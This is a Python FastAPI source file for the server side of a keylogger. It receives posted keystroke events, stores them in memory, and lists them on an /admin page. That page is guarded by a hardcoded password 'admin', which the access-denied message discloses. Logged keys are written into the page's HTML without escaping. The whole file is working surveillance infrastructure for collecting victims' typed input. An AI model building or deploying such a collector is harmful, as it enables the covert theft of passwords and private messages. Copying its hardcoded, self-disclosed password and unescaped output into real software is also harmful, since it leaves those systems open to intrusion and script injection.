
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

app = FastAPI()
logs = []

class KeyEvent(BaseModel):
    key: str
    time: str

@app.post("/log")
async def receive_log(event: KeyEvent):
    logs.append(event)
    return {"status": "received"}

@app.get("/admin", response_class=HTMLResponse)
async def show_logs(password: str = ""):
    if password != "admin":
        return HTMLResponse("<h3>Access Denied</h3><p>Use ?password=admin to access logs.</p>", status_code=401)

    rows = "".join([f"<tr><td>{log.time}</td><td>{log.key}</td></tr>" for log in logs])
    html = f"""
    <html>
    <head>
        <title>Key Logs</title>
        <style>
            table {{ border-collapse: collapse; width: 50%; }}
            th, td {{ border: 1px solid black; padding: 8px; }}
        </style>
    </head>
    <body>
        <h2>Logged Keystrokes</h2>
        <table>
            <tr><th>Timestamp</th><th>Key</th></tr>
            {rows}
        </table>
    </body>
    </html>
    """
    return HTMLResponse(content=html)

@app.get("/")
async def root():
    return {"message": "Keylogger API running"}
